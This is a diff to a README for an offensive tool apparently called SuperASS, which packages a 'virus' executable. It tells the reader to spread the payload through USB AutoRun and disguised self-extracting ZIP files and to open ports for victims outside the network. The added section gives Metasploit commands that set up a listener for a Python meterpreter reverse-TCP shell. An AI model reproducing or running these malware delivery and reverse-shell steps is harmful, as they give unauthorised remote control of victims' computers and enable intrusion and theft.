@@ -40,7 +40,7 @@ git clone https://github.com/AbdulazizDXT/SuperASS ;cd SuperASS ;chmod +x instal
 6. Now the file must be transferred to the Windows system to start creating an exe file for the virus in the USB or zip files
 
 - If you want to test the penetration outside the network, you must open a port for the IP address of your device and also put the IPv4 address and the port that you opened in step 3.  You want to receive the connection be the same port you set. IPv4 Outside Network Here : https://whatismyipaddress.com/
-- 
+
 ## [+] Use SuperASS In USB AutoRun :
 
 1. Download USB AutoRun Creator From : https://www.samlogic.net/demos/files/USBAC-DEMO-ENG-SETUP.exe
@@ -59,6 +59,26 @@ git clone https://github.com/AbdulazizDXT/SuperASS ;cd SuperASS ;chmod +x instal
 4. After compressing the file, open it, then choose the "SFX" option, then "Advanced SFX Option" & Setup Option
 5. Type MIN (1).exe & Press OK & OK to Exit
 6. Now you can use zip file for hacking / Do not try on your device
+
+## [+] How to Connect Virus/Payload :
+
+- You must have a metasploit formwork with you (Kali/Ubuntu/Fedora/Termux...)
+ * Open Terminal/Termux
+```
+msfconsole
+
+use exploit/multi/handler
+
+set payload python/meterpreter/reverse_tcp 
+
+set LHOST <YourIPAddres>
+
+set LPORT <YourPort>
+
+exploit
+
+```
+- Now you can use a USB or ZIP to hack and receive the connection from the Metasploit tool
 
 ## [√] Features:
 
